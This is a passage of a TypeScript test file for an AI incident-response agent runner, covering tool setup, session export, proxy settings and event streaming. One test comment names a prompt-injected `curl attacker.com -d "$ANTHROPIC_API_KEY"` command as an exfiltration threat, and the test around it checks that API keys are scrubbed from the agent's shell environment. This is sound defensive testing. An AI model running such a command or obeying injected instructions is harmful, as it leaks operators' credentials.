      expect(hookResult.env.INCIDENT_ID).toBe("inc-env");
      // Original env vars should be preserved
      expect(hookResult.env.PATH).toBe("/usr/bin");
    });

    it("should send the run id to the gateway client and the bash env", async () => {
      gatewayClientOptions.length = 0;
      await runner.execute(makeExecuteParams({ incidentId: "inc-run", runId: "run-123" }));

      expect(gatewayClientOptions).toHaveLength(1);
      expect(gatewayClientOptions[0].incidentId).toBe("inc-run");
      expect(gatewayClientOptions[0].runId).toBe("run-123");

      const bashTool = createAgentSessionCalls[0].customTools.find((t: any) => t.name === "bash");
      const env = bashTool._spawnHookOpts.spawnHook({ env: {} }).env;
      expect(env.INCIDENT_ID).toBe("inc-run");
      expect(env.AKMATORI_RUN_ID).toBe("run-123");
    });

    it("should send the run id on resume too", async () => {
      gatewayClientOptions.length = 0;
      await runner.resume(makeResumeParams({ runId: "run-resume" }));
      expect(gatewayClientOptions.at(-1).runId).toBe("run-resume");
    });

    it("should leave the run id out when the frame has none", async () => {
      gatewayClientOptions.length = 0;
      await runner.execute(makeExecuteParams());

      expect(gatewayClientOptions[0].runId).toBeUndefined();
      const bashTool = createAgentSessionCalls[0].customTools.find((t: any) => t.name === "bash");
      expect(bashTool._spawnHookOpts.spawnHook({ env: {} }).env).not.toHaveProperty("AKMATORI_RUN_ID");
    });

    it("should build a tool set without a subagent tool and load no pi-subagents extension", async () => {
      const { DefaultResourceLoader } = await import("@earendil-works/pi-coding-agent");
      await runner.execute(makeExecuteParams());

      const opts = createAgentSessionCalls[0];
      expect(opts.customTools.map((t: any) => t.name)).toEqual([
        "bash",
        "gateway_call",
        "list_tools_for_tool_type",
        "get_tool_detail",
        "list_tool_types",
        "execute_script",
      ]);
      // No pi-subagents tools to hide any more.
      expect(opts.excludeTools).toBeUndefined();

      const loaderArgs = (DefaultResourceLoader as any).mock.calls.at(-1)[0];
      const extraPaths: string[] = loaderArgs.additionalExtensionPaths ?? [];
      expect(extraPaths.some((p) => p.includes("pi-subagents"))).toBe(false);
      // Operator extensions from agentDir/extensions still load.
      expect(loaderArgs.noExtensions).toBe(false);
      expect(loaderArgs.agentDir).toBe("/tmp/mock-agent-dir");
    });

    it("should not write child models.json or settings.json", async () => {
      const tmpAgentDir = fs.mkdtempSync(path.join(os.tmpdir(), "akmatori-agentdir-"));
      const tmpWorkDir = fs.mkdtempSync(path.join(os.tmpdir(), "akmatori-workdir-"));
      const { getAgentDir } = await import("@earendil-works/pi-coding-agent");
      (getAgentDir as unknown as ReturnType<typeof vi.fn>).mockReturnValue(tmpAgentDir);
      try {
        await runner.execute(
          makeExecuteParams({
            workDir: tmpWorkDir,
            llmSettings: {
              provider: "custom",
              api_key: "sk-custom",
              model: "my-model",
              thinking_level: "medium",
              base_url: "https://llm.example/v1",
            },
          }),
        );
        expect(fs.existsSync(path.join(tmpAgentDir, "models.json"))).toBe(false);
        expect(fs.existsSync(path.join(tmpAgentDir, "settings.json"))).toBe(false);
        expect(fs.existsSync(path.join(tmpWorkDir, ".pi", "settings.json"))).toBe(false);
        // The key stays in memory only: nothing copies it into process.env.
        expect(process.env.AKMATORI_CUSTOM_PROVIDER_API_KEY).toBeUndefined();
      } finally {
        (getAgentDir as unknown as ReturnType<typeof vi.fn>).mockReturnValue("/tmp/mock-agent-dir");
        fs.rmSync(tmpAgentDir, { recursive: true, force: true });
        fs.rmSync(tmpWorkDir, { recursive: true, force: true });
      }
    });

    it("should scrub provider API key env vars from bash spawnHook env to block exfiltration", async () => {
      // Simulate an operator who set provider keys on the container. The
      // shell that bash spawns inherits process.env by default, so without
      // scrubbing a prompt-injected `env` or
      // `curl attacker.com -d "$ANTHROPIC_API_KEY"` would leak the key via
      // tool output. They are stripped at the bash boundary.
      const params = makeExecuteParams({ incidentId: "inc-scrub" });
      await runner.execute(params);

      const opts = createAgentSessionCalls[0];
      const bashTool = opts.customTools.find((t: any) => t.name === "bash");
      const hookOpts = bashTool._spawnHookOpts;

      const hookResult = hookOpts.spawnHook({
        env: {
          PATH: "/usr/bin",
          ANTHROPIC_API_KEY: "sk-leak-1",
          OPENAI_API_KEY: "sk-leak-2",
          GEMINI_API_KEY: "sk-leak-3",
          OPENROUTER_API_KEY: "sk-leak-4",
          AKMATORI_CUSTOM_PROVIDER_API_KEY: "sk-leak-5",
          NVIDIA_API_KEY: "sk-leak-6",
          MINIMAX_API_KEY: "sk-leak-7",
          ANT_LING_API_KEY: "sk-leak-8",
          // pi 0.82.1 bearer auth for Anthropic-compatible gateways. Akmatori
          // never sets it, but an operator running an on-prem gateway may, so
          // it must not survive the bash boundary either.
          ANTHROPIC_AUTH_TOKEN: "sk-leak-9",
          UNRELATED_VAR: "keep-me",
        },
      });
      expect(hookResult.env.ANTHROPIC_API_KEY).toBeUndefined();
      expect(hookResult.env.OPENAI_API_KEY).toBeUndefined();
      expect(hookResult.env.GEMINI_API_KEY).toBeUndefined();
      expect(hookResult.env.OPENROUTER_API_KEY).toBeUndefined();
      expect(hookResult.env.AKMATORI_CUSTOM_PROVIDER_API_KEY).toBeUndefined();
      expect(hookResult.env.NVIDIA_API_KEY).toBeUndefined();
      expect(hookResult.env.MINIMAX_API_KEY).toBeUndefined();
      expect(hookResult.env.ANT_LING_API_KEY).toBeUndefined();
      expect(hookResult.env.ANTHROPIC_AUTH_TOKEN).toBeUndefined();
      // Non-secret env vars must still pass through (PATH is required for
      // commands to resolve; arbitrary operator env should not be lost).
      expect(hookResult.env.PATH).toBe("/usr/bin");
      expect(hookResult.env.UNRELATED_VAR).toBe("keep-me");
      // Akmatori session env must still be injected.
      expect(hookResult.env.MCP_GATEWAY_URL).toBeDefined();
      expect(hookResult.env.INCIDENT_ID).toBe("inc-scrub");
    });

    it("should forward hardcoded provider retry settings to SettingsManager", async () => {
      const { SettingsManager } = await import("@earendil-works/pi-coding-agent");
      await runner.execute(makeExecuteParams());

      expect((SettingsManager as any).inMemory).toHaveBeenCalledWith({
        retry: {
          provider: {
            timeoutMs: 600_000,
            maxRetries: 3,
            maxRetryDelayMs: 60_000,
          },
        },
      });
    });

    it("should use fallback response from getLastAssistantText when no text_delta events", async () => {
      // Override prompt to emit no text_delta events
      mockSession.prompt.mockImplementationOnce(async () => {
        // No events emitted
      });
      mockSession.getLastAssistantText.mockReturnValueOnce("Fallback response");

      const result = await runner.execute(makeExecuteParams());

      expect(result.response).toBe("Fallback response");
    });
  });

  // -----------------------------------------------------------------------
  // resume
  // -----------------------------------------------------------------------

  describe("resume", () => {
    it("should create a new session and prompt with the message", async () => {
      const params = makeResumeParams({ message: "Also check disk space" });
      const result = await runner.resume(params);

      expect(mockSession.prompt).toHaveBeenCalledWith("Also check disk space");
      expect(result.session_id).toBe("mock-session-123");
    });

    it("should return ExecuteResult with metrics", async () => {
      const result = await runner.resume(makeResumeParams());

      expect(result.tokens_used).toBe(1500);
      expect(result.execution_time_ms).toBeGreaterThanOrEqual(0);
      expect(result.error).toBeUndefined();
    });

    it("should handle resume errors gracefully", async () => {
      mockSession.prompt.mockRejectedValueOnce(new Error("Session expired"));

      const result = await runner.resume(makeResumeParams());

      expect(result.error).toBe("Session expired");
    });
  });

  // -----------------------------------------------------------------------
  // cancel
  // -----------------------------------------------------------------------

  describe("cancel", () => {
    it("should abort active session", async () => {
      // Start an execution that we can cancel
      const session = createMockSession();
      // Make prompt hang so we can cancel it
      session.prompt.mockImplementation(() => new Promise(() => {}));

      // We need to inject the session into activeSessions
      // Do this by starting execute (it won't resolve because prompt hangs)
      mockSession = session;
      const execPromise = runner.execute(makeExecuteParams({ incidentId: "inc-cancel" }));

      await waitForCondition(() => runner.hasActiveSession("inc-cancel"));

      expect(runner.hasActiveSession("inc-cancel")).toBe(true);

      await runner.cancel("inc-cancel");

      expect(session.abort).toHaveBeenCalled();
      expect(runner.hasActiveSession("inc-cancel")).toBe(false);
    });

    it("should be a no-op for unknown incident ID", async () => {
      // Should not throw
      await runner.cancel("nonexistent-incident");
    });

    it("should trigger signal propagation to active tool calls via session.abort()", async () => {
      // Verify that cancel() calls session.abort() which in pi-mono 0.63.1
      // propagates the AbortSignal to all active tool execute() calls.
      const session = createMockSession();
      let abortCalled = false;
      session.abort.mockImplementation(async () => {
        abortCalled = true;
      });
      session.prompt.mockImplementation(() => new Promise(() => {})); // hang

      mockSession = session;
      const execPromise = runner.execute(makeExecuteParams({ incidentId: "inc-signal-prop" }));

      await waitForCondition(() => runner.hasActiveSession("inc-signal-prop"));
      expect(runner.hasActiveSession("inc-signal-prop")).toBe(true);

      await runner.cancel("inc-signal-prop");

      expect(abortCalled).toBe(true);
      expect(session.abort).toHaveBeenCalledTimes(1);
      expect(runner.hasActiveSession("inc-signal-prop")).toBe(false);
    });

    // Models the supersession race: run 1 is in-flight, run 2 has already
    // installed its session in activeSessions, then run 1's cancel resolves
    // session.abort(). cancel() must NOT delete run 2's slot — that would
    // leave the live replacement run untracked so a later
    // cancel/abortInFlightSession would no-op and overlapping sessions could
    // recur. The compare-and-delete in cancel() guards against this.
    it("should not delete activeSessions slot when a replacement session has taken over", async () => {
      const session1 = createMockSession();
      const session2 = createMockSession();

      // Cancel awaits session1.abort(); during that await we plant session2
      // as the current owner of the slot, modelling the orchestrator having
      // moved on to run 2 while run 1 is still tearing down.
      session1.abort.mockImplementation(async () => {
        runner["activeSessions"].set("inc-replace", session2 as any);
      });

      runner["activeSessions"].set("inc-replace", session1 as any);

      await runner.cancel("inc-replace");

      // session2 must still be the live entry — cancel must not have
      // clobbered it after session1's abort resolved.
      expect(runner["activeSessions"].get("inc-replace")).toBe(session2 as any);
      expect(runner.hasActiveSession("inc-replace")).toBe(true);
    });
  });

  // -----------------------------------------------------------------------
  // dispose
  // -----------------------------------------------------------------------

  describe("dispose", () => {
    it("should abort all active sessions", async () => {
      const session1 = createMockSession();
      const session2 = createMockSession();
      session1.prompt.mockImplementation(() => new Promise(() => {}));
      session2.prompt.mockImplementation(() => new Promise(() => {}));

      // Start two executions
      mockSession = session1;
      runner.execute(makeExecuteParams({ incidentId: "inc-d1" }));
      await waitForCondition(() => runner.hasActiveSession("inc-d1"));

      mockSession = session2;
      runner.execute(makeExecuteParams({ incidentId: "inc-d2" }));
      await waitForCondition(() => runner.hasActiveSession("inc-d2"));

      await runner.dispose();

      expect(session1.abort).toHaveBeenCalled();
      expect(session2.abort).toHaveBeenCalled();
      expect(runner.hasActiveSession("inc-d1")).toBe(false);
      expect(runner.hasActiveSession("inc-d2")).toBe(false);
    });
  });

  // -----------------------------------------------------------------------
  // Event streaming
  // -----------------------------------------------------------------------

  describe("event streaming", () => {
    it("should format tool execution summary with args and output", async () => {
      const onOutput = vi.fn();
      mockSession.prompt.mockImplementationOnce(async () => {
        for (const sub of mockSession._subscribers) {
          sub({
            type: "tool_execution_start",
            toolCallId: "tc-1",
            toolName: "ssh_execute_command",
            args: { command: "uptime" },
          });
          sub({
            type: "tool_execution_update",
            toolCallId: "tc-1",
            toolName: "ssh_execute_command",
            args: { command: "uptime" },
            partialResult: {
              content: [{ type: "text", text: "partial output" }],
            },
          });
          sub({
            type: "tool_execution_end",
            toolCallId: "tc-1",
            toolName: "ssh_execute_command",
            result: {
              content: [{ type: "text", text: "final output" }],
            },
            isError: false,
          });
        }
      });

      await runner.execute(makeExecuteParams({ onOutput }));

      const output = onOutput.mock.calls.map((call: any[]) => call[0]).join("");
      expect(output).toContain("🛠️ Running: ssh_execute_command");
      expect(output).toContain("✅ Ran: ssh_execute_command");
      expect(output).toContain("Args:");
      expect(output).toContain("\"command\": \"uptime\"");
      expect(output).toContain("Output:");
      expect(output).toContain("partial output");
      expect(output).toContain("final output");
    });

    it("should format tool_execution_end error events", async () => {
      const onOutput = vi.fn();
      mockSession.prompt.mockImplementationOnce(async () => {
        for (const sub of mockSession._subscribers) {
          sub({ type: "tool_execution_start", toolCallId: "tc-2", toolName: "ssh_execute_command", args: {} });
          sub({ type: "tool_execution_end", toolCallId: "tc-2", toolName: "ssh_execute_command", result: {}, isError: true });
        }
      });

      await runner.execute(makeExecuteParams({ onOutput }));

      const output = onOutput.mock.calls.map((call: any[]) => call[0]).join("");
      expect(output).toContain("❌ Failed: ssh_execute_command");
    });

    it("should emit thinking content to execution log", async () => {
      const onOutput = vi.fn();
      mockSession.prompt.mockImplementationOnce(async () => {
        for (const sub of mockSession._subscribers) {
          sub({
            type: "message_update",
            message: {},
            assistantMessageEvent: {
              type: "thinking_start",
              contentIndex: 0,
              partial: {},
            },
          });
          sub({
            type: "message_update",
            message: {},
            assistantMessageEvent: {
              type: "thinking_delta",
              contentIndex: 0,
              delta: "Investigating CPU spike",
              partial: {},
            },
          });
          sub({
            type: "message_update",
            message: {},
            assistantMessageEvent: {
              type: "thinking_end",
              contentIndex: 0,
              content: "Investigating CPU spike",
              partial: {},
            },
          });
        }
      });

      await runner.execute(makeExecuteParams({ onOutput }));

      const output = onOutput.mock.calls.map((call: any[]) => call[0]).join("");
      expect(output).toContain("🤔 Investigating CPU spike");
    });

    it("should stream compaction_start and compaction_end events", async () => {
      const onOutput = vi.fn();
      mockSession.prompt.mockImplementationOnce(async () => {
        for (const sub of mockSession._subscribers) {
          sub({ type: "compaction_start", reason: "threshold" });
          sub({ type: "compaction_end", reason: "threshold", aborted: false, willRetry: false });
        }
      });

      await runner.execute(makeExecuteParams({ onOutput }));

      const output = onOutput.mock.calls.map((call: any[]) => call[0]).join("");
      expect(output).toContain("Compacting context");
      expect(output).toContain("threshold");
      expect(output).toContain("compaction complete");
    });

    it("should stream compaction_end with aborted status", async () => {
      const onOutput = vi.fn();
      mockSession.prompt.mockImplementationOnce(async () => {
        for (const sub of mockSession._subscribers) {
          sub({ type: "compaction_start", reason: "overflow" });
          sub({ type: "compaction_end", reason: "overflow", aborted: true, willRetry: false });
        }
      });

      await runner.execute(makeExecuteParams({ onOutput }));

      const output = onOutput.mock.calls.map((call: any[]) => call[0]).join("");
      expect(output).toContain("compaction aborted");
    });

    it("should include error message and willRetry in compaction_end when aborted", async () => {
      const onOutput = vi.fn();
      mockSession.prompt.mockImplementationOnce(async () => {
        for (const sub of mockSession._subscribers) {
          sub({
            type: "compaction_end",
            reason: "overflow",
            aborted: true,
            willRetry: true,
            errorMessage: "token limit exceeded",
          });
        }
      });

      await runner.execute(makeExecuteParams({ onOutput }));

      const output = onOutput.mock.calls.map((call: any[]) => call[0]).join("");
      expect(output).toContain("compaction aborted");
      expect(output).toContain("token limit exceeded");
      expect(output).toContain("will retry");
    });

    it("should stream auto_retry_start events", async () => {
      const onOutput = vi.fn();
      mockSession.prompt.mockImplementationOnce(async () => {
        for (const sub of mockSession._subscribers) {
          sub({
            type: "auto_retry_start",
            attempt: 2,
            maxAttempts: 3,
            delayMs: 1000,
            errorMessage: "server_error",
          });
        }
      });

      await runner.execute(makeExecuteParams({ onOutput }));

      const output = onOutput.mock.calls.map((call: any[]) => call[0]).join("");
      expect(output).toContain("Retrying");
      expect(output).toContain("attempt 2/3");
      expect(output).toContain("server_error");
    });

    it("should stream auto_retry_end failure events with attempt count", async () => {
      const onOutput = vi.fn();
      mockSession.prompt.mockImplementationOnce(async () => {
        for (const sub of mockSession._subscribers) {
          sub({
            type: "auto_retry_end",
            success: false,
            attempt: 3,
            finalError: "API quota exceeded",
          });
        }
      });

      await runner.execute(makeExecuteParams({ onOutput }));

      const output = onOutput.mock.calls.map((call: any[]) => call[0]).join("");
      expect(output).toContain("retries exhausted");
      expect(output).toContain("3 attempts");
      expect(output).toContain("API quota exceeded");
    });

    it("should not emit output for successful auto_retry_end", async () => {
      const onOutput = vi.fn();
      mockSession.prompt.mockImplementationOnce(async () => {
        for (const sub of mockSession._subscribers) {
          sub({ type: "auto_retry_end", success: true, attempt: 2 });
        }
      });

      await runner.execute(makeExecuteParams({ onOutput }));

      const output = onOutput.mock.calls.map((call: any[]) => call[0]).join("");
      expect(output).not.toContain("retries exhausted");
    });

    it("should accumulate tokens from turn_end events", async () => {
      mockSession.prompt.mockImplementationOnce(async () => {
        for (const sub of mockSession._subscribers) {
          sub({
            type: "turn_end",
            message: { role: "assistant", usage: { totalTokens: 500 } },
            toolResults: [],
          });
          sub({
            type: "turn_end",
            message: { role: "assistant", usage: { totalTokens: 300 } },
            toolResults: [],
          });
        }
      });

      const result = await runner.execute(makeExecuteParams());

      expect(result.tokens_used).toBe(800);
    });

    it("should count only the parent's turn usage, never usage reported on a tool result", async () => {
      // pi-subagents children reported their tokens on the tool result; the
      // worker no longer runs children, so tokens_used is the parent's own.
      mockSession.prompt.mockImplementationOnce(async () => {
        for (const sub of mockSession._subscribers) {
          sub({
            type: "tool_execution_end",
            toolCallId: "tc-sub",
            toolName: "gateway_call",
            result: {
              content: [{ type: "text", text: "ok" }],
              details: { totalChildUsage: { input: 100, output: 50, cacheRead: 0, cacheWrite: 0, cost: 0.01, turns: 1 } },
            },
            isError: false,
          });
          sub({
            type: "turn_end",
            message: { role: "assistant", usage: { totalTokens: 500 } },
            toolResults: [],
          });
        }
      });

      const result = await runner.execute(makeExecuteParams());

      expect(result.tokens_used).toBe(500);
    });

    it("should include compaction summarization tokens in the total", async () => {
      // The compaction LLM call is invisible to turn_end (which only carries
      // assistant-message usage), so without counting compaction_end the long
      // investigations that actually compact under-report their cost.
      mockSession.prompt.mockImplementationOnce(async () => {
        for (const sub of mockSession._subscribers) {
          sub({
            type: "turn_end",
            message: { role: "assistant", usage: { totalTokens: 500 } },
            toolResults: [],
          });
          sub({
            type: "compaction_end",
            reason: "threshold",
            aborted: false,
            willRetry: false,
            result: { summary: "s", firstKeptEntryId: "e1", tokensBefore: 9000, usage: { totalTokens: 250 } },
          });
        }
      });

      const result = await runner.execute(makeExecuteParams());

      expect(result.tokens_used).toBe(750);
    });

    it("should not count compaction tokens when usage is absent (aborted compaction)", async () => {
      mockSession.prompt.mockImplementationOnce(async () => {
        for (const sub of mockSession._subscribers) {
          sub({
            type: "turn_end",
            message: { role: "assistant", usage: { totalTokens: 500 } },
            toolResults: [],
          });
          // Aborted compaction carries no result — must not throw or miscount.
          sub({
            type: "compaction_end",
            reason: "overflow",
            aborted: true,
            willRetry: false,
            result: undefined,
          });
        }
      });

      const result = await runner.execute(makeExecuteParams());

      expect(result.tokens_used).toBe(500);
    });
  });

  // -----------------------------------------------------------------------
  // Session export
  // -----------------------------------------------------------------------

  describe("session export", () => {
    it("should export session JSONL to workDir/session_export.jsonl on success", async () => {
      const fs = await import("node:fs");
      const path = await import("node:path");
      const tmpDir = fs.mkdtempSync(path.join("/tmp", "agent-export-"));

      // Create a fake session file that getSessionFile will point to
      const fakeSessionFile = path.join(tmpDir, "session.jsonl");
      fs.writeFileSync(fakeSessionFile, '{"type":"header","id":"h1"}\n{"type":"message","role":"user","content":"test"}\n');

      // Make SessionManager.create return a mock with getSessionFile pointing to fake file
      const { SessionManager } = await import("@earendil-works/pi-coding-agent");
      (SessionManager.create as any).mockReturnValueOnce({
        newSession: vi.fn(),
        getSessionId: vi.fn(() => "mock-session-123"),
        getSessionFile: vi.fn(() => fakeSessionFile),
      });

      const result = await runner.execute(makeExecuteParams({ workDir: tmpDir }));

      const expectedExportPath = path.join(tmpDir, "session_export.jsonl");
      expect(result.session_export).toBe(expectedExportPath);
      expect(fs.existsSync(expectedExportPath)).toBe(true);

      const exportedContent = fs.readFileSync(expectedExportPath, "utf-8");
      expect(exportedContent).toContain('"type":"header"');
      expect(exportedContent).toContain('"type":"message"');

      // Cleanup
      fs.rmSync(tmpDir, { recursive: true });
    });

    it("should export session JSONL even on execution error", async () => {
      const fs = await import("node:fs");
      const path = await import("node:path");
      const tmpDir = fs.mkdtempSync(path.join("/tmp", "agent-export-err-"));

      const fakeSessionFile = path.join(tmpDir, "session.jsonl");
      fs.writeFileSync(fakeSessionFile, '{"type":"header","id":"h1"}\n');

      const { SessionManager } = await import("@earendil-works/pi-coding-agent");
      (SessionManager.create as any).mockReturnValueOnce({
        newSession: vi.fn(),
        getSessionId: vi.fn(() => "mock-session-123"),
        getSessionFile: vi.fn(() => fakeSessionFile),
      });

      mockSession.prompt.mockRejectedValueOnce(new Error("API error"));

      const result = await runner.execute(makeExecuteParams({ workDir: tmpDir }));

      expect(result.error).toBe("API error");
      const expectedExportPath = path.join(tmpDir, "session_export.jsonl");
      expect(result.session_export).toBe(expectedExportPath);
      expect(fs.existsSync(expectedExportPath)).toBe(true);

      fs.rmSync(tmpDir, { recursive: true });
    });

    it("should return undefined session_export when no session file exists", async () => {
      const result = await runner.execute(makeExecuteParams());

      // Default mock returns undefined for getSessionFile
      expect(result.session_export).toBeUndefined();
    });

    it("should not fail execution when session export fails", async () => {
      const { SessionManager } = await import("@earendil-works/pi-coding-agent");
      (SessionManager.create as any).mockReturnValueOnce({
        newSession: vi.fn(),
        getSessionId: vi.fn(() => "mock-session-123"),
        // Point to a non-existent file — copyFileSync will throw
        getSessionFile: vi.fn(() => "/nonexistent/path/session.jsonl"),
      });

      const result = await runner.execute(makeExecuteParams());

      // Execution should still succeed
      expect(result.session_id).toBe("mock-session-123");
      expect(result.response).toBe("Analysis complete.");
      expect(result.session_export).toBeUndefined();
      expect(result.error).toBeUndefined();
    });
  });

  // -----------------------------------------------------------------------
  // Proxy configuration
  // -----------------------------------------------------------------------

  describe("proxy configuration", () => {
    it("should set env vars and undici EnvHttpProxyAgent when llm_enabled is true", async () => {
      const proxyConfig: ProxyConfig = {
        url: "http://proxy.example.com:8080",
        no_proxy: "localhost,127.0.0.1",
        llm_enabled: true,
        slack_enabled: false,
        zabbix_enabled: false,
        victoria_metrics_enabled: false,
      };

      let capturedHttpProxy: string | undefined;
      let capturedHttpsProxy: string | undefined;
      let capturedNoProxy: string | undefined;
      let capturedDispatcher: string | undefined;

      // Capture env vars and dispatcher during session creation
      const { createAgentSession } = await import("@earendil-works/pi-coding-agent");
      (createAgentSession as any).mockImplementationOnce(async () => {
        capturedHttpProxy = process.env.HTTP_PROXY;
        capturedHttpsProxy = process.env.HTTPS_PROXY;
        capturedNoProxy = process.env.NO_PROXY;
        const undici = await import("undici");
        capturedDispatcher = undici.getGlobalDispatcher()?.constructor?.name;
        return { session: mockSession, extensionsResult: {} };
      });

      await runner.execute(makeExecuteParams({ proxyConfig }));

      expect(capturedHttpProxy).toBe("http://proxy.example.com:8080");
      expect(capturedHttpsProxy).toBe("http://proxy.example.com:8080");
      expect(capturedNoProxy).toBe("localhost,127.0.0.1");
      expect(capturedDispatcher).toBe("EnvHttpProxyAgent");
    });

    it("should NOT set proxy when llm_enabled is false", async () => {
      const proxyConfig: ProxyConfig = {
        url: "http://proxy.example.com:8080",
        no_proxy: "",
        llm_enabled: false,
        slack_enabled: true,
        zabbix_enabled: true,
        victoria_metrics_enabled: false,
      };

      let capturedHttpProxy: string | undefined;
      let capturedDispatcher: string | undefined;

      const { createAgentSession } = await import("@earendil-works/pi-coding-agent");
      (createAgentSession as any).mockImplementationOnce(async () => {
        capturedHttpProxy = process.env.HTTP_PROXY;
        const undici = await import("undici");
        capturedDispatcher = undici.getGlobalDispatcher()?.constructor?.name;
        return { session: mockSession, extensionsResult: {} };
      });

      await runner.execute(makeExecuteParams({ proxyConfig }));

      expect(capturedHttpProxy).toBe("");
      expect(capturedDispatcher).toBe("Agent");
    });

    it("should restore container env (empty in test) and reset dispatcher when no proxy config provided", async () => {
      // Set some stale proxy vars first
      process.env.HTTP_PROXY = "http://old-proxy:1234";
      process.env.HTTPS_PROXY = "http://old-proxy:1234";

      let capturedHttpProxy: string | undefined;
      let capturedDispatcher: string | undefined;

      const { createAgentSession } = await import("@earendil-works/pi-coding-agent");
      (createAgentSession as any).mockImplementationOnce(async () => {
        capturedHttpProxy = process.env.HTTP_PROXY;
        const undici = await import("undici");
        capturedDispatcher = undici.getGlobalDispatcher()?.constructor?.name;
        return { session: mockSession, extensionsResult: {} };
      });

      await runner.execute(makeExecuteParams({ proxyConfig: undefined }));

      // proxy.ts snapshots HTTP_PROXY at module load. In the test process the
      // env is unset at load time, so the snapshot is "" and applyProxyConfig
      // restores that here — i.e. the stale value set above is discarded.
      expect(capturedHttpProxy).toBe("");
      expect(capturedDispatcher).toBe("Agent");
    });

    it("should sync both upper- and lower-case env vars so undici sees a consistent value", async () => {
      // Regression: undici's EnvHttpProxyAgent uses `??` (not `||`) when
      // reading env, so a lowercase empty string would silently shadow a
      // populated uppercase env var. proxy.ts must keep both case variants in
      // lock-step on every applyProxyConfig call.
      const proxyConfig: ProxyConfig = {
        url: "http://proxy.example.com:8080",
        no_proxy: "localhost,127.0.0.1",
        llm_enabled: true,
        slack_enabled: false,
        zabbix_enabled: false,
        victoria_metrics_enabled: false,
      };

      // Simulate the compose-injected lowercase empty defaults before the run
      process.env.http_proxy = "";
      process.env.https_proxy = "";
      process.env.no_proxy = "";

      const captured: Record<string, string | undefined> = {};
      const { createAgentSession } = await import("@earendil-works/pi-coding-agent");
      (createAgentSession as any).mockImplementationOnce(async () => {
        captured.HTTP_PROXY = process.env.HTTP_PROXY;
        captured.HTTPS_PROXY = process.env.HTTPS_PROXY;
        captured.NO_PROXY = process.env.NO_PROXY;
        captured.http_proxy = process.env.http_proxy;
        captured.https_proxy = process.env.https_proxy;
        captured.no_proxy = process.env.no_proxy;
        return { session: mockSession, extensionsResult: {} };
      });

      await runner.execute(makeExecuteParams({ proxyConfig }));

      expect(captured.HTTP_PROXY).toBe("http://proxy.example.com:8080");
      expect(captured.http_proxy).toBe("http://proxy.example.com:8080");
      expect(captured.HTTPS_PROXY).toBe("http://proxy.example.com:8080");
      expect(captured.https_proxy).toBe("http://proxy.example.com:8080");
      expect(captured.NO_PROXY).toBe("localhost,127.0.0.1");
      expect(captured.no_proxy).toBe("localhost,127.0.0.1");
    });

  });
});

// ---------------------------------------------------------------------------
// extractSkillNameFromReadPath — last-skill tracking for formatting rules
// ---------------------------------------------------------------------------

describe("extractSkillNameFromReadPath", () => {
  const skillsDir = "/akmatori/skills";

  it("extracts the skill name from a SKILL.md read", () => {
    expect(extractSkillNameFromReadPath(skillsDir, "/akmatori/skills/victoria-metrics/SKILL.md")).toBe(
      "victoria-metrics",
    );
  });

  it("normalizes redundant path segments", () => {
    expect(extractSkillNameFromReadPath(skillsDir, "/akmatori/skills/./netbox//SKILL.md")).toBe("netbox");
  });

  it("ignores non-SKILL.md reads inside the skills dir", () => {
    expect(extractSkillNameFromReadPath(skillsDir, "/akmatori/skills/netbox/scripts/query.sh")).toBeUndefined();
    expect(extractSkillNameFromReadPath(skillsDir, "/akmatori/skills/netbox/README.md")).toBeUndefined();
  });

  it("ignores nested SKILL.md deeper than one level", () => {
    expect(extractSkillNameFromReadPath(skillsDir, "/akmatori/skills/a/b/SKILL.md")).toBeUndefined();
  });

  it("ignores SKILL.md outside the skills dir", () => {
    expect(extractSkillNameFromReadPath(skillsDir, "/other/place/netbox/SKILL.md")).toBeUndefined();
    expect(extractSkillNameFromReadPath(skillsDir, "/akmatori/skills-evil/netbox/SKILL.md")).toBeUndefined();
  });

  it("ignores a direct read of the skills dir itself", () => {
    expect(extractSkillNameFromReadPath(skillsDir, "/akmatori/skills/SKILL.md")).toBeUndefined();
  });

  it("ignores the generated connected-tools skill so the domain skill stays latched", () => {
    expect(extractSkillNameFromReadPath(skillsDir, "/akmatori/skills/connected-tools/SKILL.md")).toBeUndefined();
  });

  it("handles missing skillsDir and non-string args", () => {
    expect(extractSkillNameFromReadPath(undefined, "/akmatori/skills/netbox/SKILL.md")).toBeUndefined();
    expect(extractSkillNameFromReadPath(skillsDir, undefined)).toBeUndefined();
    expect(extractSkillNameFromReadPath(skillsDir, 42)).toBeUndefined();
    expect(extractSkillNameFromReadPath(skillsDir, "")).toBeUndefined();
  });
});

describe("codemode spike flag", () => {
  beforeEach(() => {
    createAgentSessionCalls = [];
  });

  it("is off by default: no gateway_fetch, no codemode extension, no defaultTools", async () => {
    const { DefaultResourceLoader, SettingsManager } = await import("@earendil-works/pi-coding-agent");
    const runner = new AgentRunner({ mcpGatewayUrl: "http://mcp-gateway:8080" });
    await runner.execute(makeExecuteParams({ incidentId: "inc-cm-off" }));

    const opts = createAgentSessionCalls[0];
    const names = opts.customTools.map((t: any) => t.name);
    expect(names).not.toContain("gateway_fetch");
    const loaderArgs = (DefaultResourceLoader as any).mock.calls.at(-1)[0];
    // Only the always-on tool output limit.
    expect(loaderArgs.extensionFactories).toHaveLength(1);
    const settingsArgs = (SettingsManager.inMemory as any).mock.calls.at(-1)[0];
    expect(settingsArgs.defaultTools).toBeUndefined();
    const gatewayCall = opts.customTools.find((t: any) => t.name === "gateway_call");
    expect(gatewayCall.promptGuidelines.join("\n")).not.toContain("codemode");
  });

  it("when on: adds gateway_fetch (codemode exposure), the codemode extension and +codemode default tool", async () => {
    const { DefaultResourceLoader, SettingsManager, createCodemodeExtension } = await import("@earendil-works/pi-coding-agent");
    const runner = new AgentRunner({ mcpGatewayUrl: "http://mcp-gateway:8080", codemode: true });
    await runner.execute(makeExecuteParams({ incidentId: "inc-cm-on" }));

    const opts = createAgentSessionCalls[0];
    const fetchTool = opts.customTools.find((t: any) => t.name === "gateway_fetch");
    expect(fetchTool).toBeDefined();
    expect(fetchTool.exposure).toBe("codemode");
    expect(fetchTool.namespace?.name).toBe("akmatori");
    expect(opts.customTools).toHaveLength(7);
    expect(createCodemodeExtension).toHaveBeenCalledWith({ mode: "on", models: false });
    const loaderArgs = (DefaultResourceLoader as any).mock.calls.at(-1)[0];
    expect(loaderArgs.extensionFactories).toHaveLength(2);
    expect(loaderArgs.extensionFactories[1]).toEqual({ __codemodeFactory: true, opts: { mode: "on", models: false } });
    const settingsArgs = (SettingsManager.inMemory as any).mock.calls.at(-1)[0];
    expect(settingsArgs.defaultTools).toEqual(["+codemode"]);
